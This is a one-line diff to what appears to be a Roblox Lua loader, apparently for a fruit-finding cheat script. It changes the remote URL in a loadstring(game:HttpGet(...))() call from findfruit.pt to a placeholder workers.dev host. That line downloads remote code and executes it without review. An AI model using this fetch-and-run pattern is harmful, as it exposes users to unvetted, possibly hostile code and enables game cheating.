@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://findfruit.pt"))()
+loadstring(game:HttpGet("https://findfruit.yourname.workers.dev"))()
